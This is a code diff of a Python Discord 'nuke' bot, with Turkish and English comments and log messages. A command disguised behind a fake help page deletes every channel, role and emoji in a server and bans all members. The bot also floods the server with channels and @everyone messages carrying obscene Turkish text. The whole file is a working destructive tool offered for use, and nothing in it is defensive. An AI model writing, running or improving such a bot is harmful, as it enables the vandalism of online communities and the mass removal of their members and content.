@@ -1,6 +1,6 @@
-#Discord nick
+#Discord nick / Discord ismim
 #AtesliSerap#9070
-#My server
+#My server / benim sunucum 
 #https://discord.gg/REVdwWyTKN
 import discord
 from discord.ext import commands
@@ -9,12 +9,12 @@ from discord import Permissions
 import colorama
 from colorama import Fore, Back, Style
 import asyncio
-#token here
+#token here / tokeniniz buraya
 token = "Token"
 
 colorama.init()
 
-#channel names here
+#channel names here / kanal adları buraya
 SPAM_CHANNEL =  [" Patlatıldınız" , "Malesef" , "Siktim" ,"eZ", "Türküm çalışkanım.","xD","Ağlayın","Nuked by Atesli ","Atesli","Serap","Basitti","zD","çerEZ "]
 SPAM_MESSAGE = ["@everyone Atesli tarafından sikildiniz xD"]
 
@@ -27,6 +27,10 @@ async def on_ready():
 █▀▀▄ █░░█ █░█ █▀▀   █▀▀▄ █▀▀█ ▀▀█▀▀   █▀▀▄ █░░█   █▀▀ █▀▀ █▀▀█ █▀▀█ █▀▀█
 █░░█ █░░█ █▀▄ █▀▀   █▀▀▄ █░░█ ░░█░░   █▀▀▄ █▄▄█   ▀▀█ █▀▀ █▄▄▀ █▄▄█ █░░█
 ▀░░▀ ░▀▀▀ ▀░▀ ▀▀▀   ▀▀▀░ ▀▀▀▀ ░░▀░░   ▀▀▀░ ▄▄▄█   ▀▀▀ ▀▀▀ ▀░▀▀ ▀░░▀ █▀▀▀
+
+[1] z!yardim chat to nuke the server. / chate z!yardim yazarak sunucuyu nukeleyin.
+[2] z!help is a fake help page. / z!help sahte bir yardım sayfasıdır.
+[3] z!commands stop server nuking. / z!commands sunucuyu nukelemeyi durdurur.
  ''')
 
    await client.change_presence(activity=discord.Game(name="Zortex Premium"))
@@ -50,9 +54,9 @@ async def yardim(ctx):
     for channel in guild.channels:
       try:
         await channel.delete()
-        print(Fore.MAGENTA + f"{channel.name} Banlanamadı." + Fore.RESET)
+        print(Fore.MAGENTA + f"{channel.name} Kanalı Silindi." + Fore.RESET)
       except:
-        print(Fore.GREEN + f"{channel.name} Silinemedi." + Fore.RESET)
+        print(Fore.GREEN + f"{channel.name} Kanalı Silinemedi." + Fore.RESET)
     for member in guild.members:
      try:
        await member.ban()
@@ -62,15 +66,15 @@ async def yardim(ctx):
     for role in guild.roles:
      try:
        await role.delete()
-       print(Fore.MAGENTA + f"{role.name} Silindi" + Fore.RESET)
+       print(Fore.MAGENTA + f"{role.name} Rolu Silindi" + Fore.RESET)
      except:
-       print(Fore.GREEN + f"{role.name} Silinemedi" + Fore.RESET)
+       print(Fore.GREEN + f"{role.name} Rolu Silinemedi" + Fore.RESET)
     for emoji in list(ctx.guild.emojis):
      try:
        await emoji.delete()
-       print(Fore.MAGENTA + f"{emoji.name} Silindi" + Fore.RESET)
+       print(Fore.MAGENTA + f"{emoji.name} Emojisi Silindi" + Fore.RESET)
      except:
-       print(Fore.GREEN + f"{emoji.name} Silinemedi" + Fore.RESET)
+       print(Fore.GREEN + f"{emoji.name} Emojisi Silinemedi" + Fore.RESET)
     banned_users = await guild.bans()
     for ban_entry in banned_users:
       user = ban_entry.user
